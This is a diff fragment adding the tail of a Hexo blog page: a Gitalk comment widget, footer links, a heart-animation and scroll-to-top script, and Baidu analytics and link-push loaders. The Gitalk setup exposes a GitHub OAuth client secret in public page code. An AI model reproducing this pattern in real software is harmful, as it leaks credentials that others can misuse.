+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <div id="gitalk-container"></div>
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+            clientID: 'fa567664f6bdb5976298',
+            clientSecret: 'ee096f560d4360445220f5063af3bf6e4a8ba8e5',
+            id: window.location.pathname,
+            repo: 'fooying_blog',
+            owner: 'fooying',
+            admin: 'fooying'
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="https://github.com/fooying" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="/links">友情链接</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/fooying/hexo-theme-xoxo-plus" target="_blank">Theme xoxo-plus</a> |
+        <a class="bottom-item" href="/atom.xml">订阅</a>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function () {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?f290e5fbd596aedbb751f38a7d377f48";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
